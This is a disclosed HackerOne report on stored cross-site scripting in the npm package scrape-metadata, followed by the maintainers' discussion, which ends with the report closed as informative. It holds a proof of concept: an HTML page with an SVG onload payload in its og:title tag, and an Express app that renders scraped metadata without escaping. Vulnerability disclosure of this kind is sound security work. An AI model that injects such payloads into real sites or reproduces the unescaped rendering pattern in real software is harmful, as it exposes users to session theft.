---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/node
substate: "informative"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2018-07-27
submitted: 2018-06-21T15:16:13.694Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "johnssimon007"
source: "https://hackerone.com/reports/369573"
title: "stored xss in scrape-metadata when reading metadata from an html page"
---
# stored xss in scrape-metadata when reading metadata from an html page

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Node.js third-party modules | **Disclosed:** 2018-07-27

- Report: [https://hackerone.com/reports/369573](https://hackerone.com/reports/369573)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2018-06-21T15:16:13.694Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hy

# Module
scrape-metadata
https://www.npmjs.com/package/scrape-metadata

## Module Description
a module used to scrape meta data contents from an article

## Vulnerability Description
It was possible to embed malicious js code in metadata content read by scrape-metadata. When library reads such metadata, there was no sanitization performed. If output from scrape-metadata is rendered directly in HTML code,it can lead to xss/html injection.

## Steps To Reproduce:
create a website, I used a local server available at http://127.0.0.1:8080
Below is html file with js code injected in 'og:title property' and i uploaded the file to my
remote server http://pokegen.in/test.html

<!doctype html>
<html xmlns:og="http://ogp.me/ns#" lang="en">

<head>
    <meta charset="utf8">
    <title>scrap-meta</title>

    <meta property="og:description" content="hackerone">
    <meta property="og:image" content="image">
    <meta property="og:title" content='https://google.com<svg/onload=prompt(1)>'>
    <meta property="og:type" content="article">
</head>
<body>
</body>
</html>

install scrape-metadata
npm install scrape-metadata

const http=require('http');
const server=http.createServer();
const express=require('express');
const app=express();
const scrape = require('scrape-metadata')
var url = "http://pokegen.in/test.html";
app.get('/scrap', function(req, res) {
scrape(url, (err, meta) => {
    console.log(meta)
      let __html = `
               <div>
                   <p>site title:${JSON.stringify(meta)}</p>
               </div>
           `
           res.send(__html)
  });

});

app.listen(8080)

save this as scrap.js
now run the app,node scrap.js
now goto http://127.0.0.1:8080/scrap on browser.and you will get a javascript prompt

Supporting Material/References:

Configuration I've used to find this vulnerability:
windows 7
node 8.9.3
npm 5.5.1
curl 7.54.0
# Wrap up
 If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,
johns simon


- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

This might lead to stealing session cookies from infected website, and much more sophisticated attacks

## Timeline

- **Report Filed**
- **2018-06-22** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **Report Triaged**
- **External User Joined**
- **2018-06-22** @lirantal: Hi @5ilverhawk

Thanks for reporting this issue.

I'm not so sure that this XSS falls under the responsibility of the scrape-metadata module. It will require knowing in advance the target content type to encode the data for in order to escape it properly.

I will invite the package maintainer to this issue to further discuss.
- **2018-06-22** @bevacqua: Agreed, I'd expect consumers to sanitize this content before embedding in HTML, as they would any untrusted user input.
- **2018-06-23** @johnssimon007: @ bevacqua
I am not sure if XSS payloads in <meta> tags shouldn't be sanitized by scape-metadata itself - it's not the place where you expect to find <script> tag and some JavaScript code :) .so as most developers might assumes its safe

  simple HTML escaping is all you need to do to make sure output is safe:

https://www.npmjs.com/package/escape-html

Besides the fix, maybe we should also add a note to the package's README about security concerns as @lirantal proposed in case https://hackerone.com/reports/309367
- **2018-06-23** @lirantal: I think it's a good idea to add a security disclaimer to the module as @5ilverhawk suggested.
WDYT @bevacqua ?
- **Changed Scope**
- **2018-06-29** @lirantal: @bevacqua will you please be able to follow-up on adding a security disclaimer on the README as well as investigating what @5ilverhawk suggested?
- **2018-07-17** @johnssimon007: Hy @lirantal it seems there is no response from package maintainer..
- **2018-07-17** @lirantal: Looks like it. Seems like we'll close it as informative and leave it at that. 
What about if you open an issue in the github repository to raise the security concern and recommend them to  update the README ?
- **2018-07-27** @lirantal: @bevacqua another friendly reminder to add a security disclaimer to the project's README
@5ilverhawk I will go ahead and close this issue and what I suggest is that you may open an issue about this in the project's github and also maybe a PR to add that security disclaimer?
- **Report Informative**
- **Agreed On Going Public**
- **2018-07-27** @johnssimon007: @lirantal  yep..i will do it.And thanks for following up
- **2018-07-27** @lirantal: No problems.
Thanks for submitting the report and hoping to collaborate more in the future!
- **2018-07-27** @johnssimon007: @lirantal antal?can you disclose the issue?
- **Agreed On Going Public**
- **Report Became Public**
- **2018-07-27** @lirantal: Yes, just did.
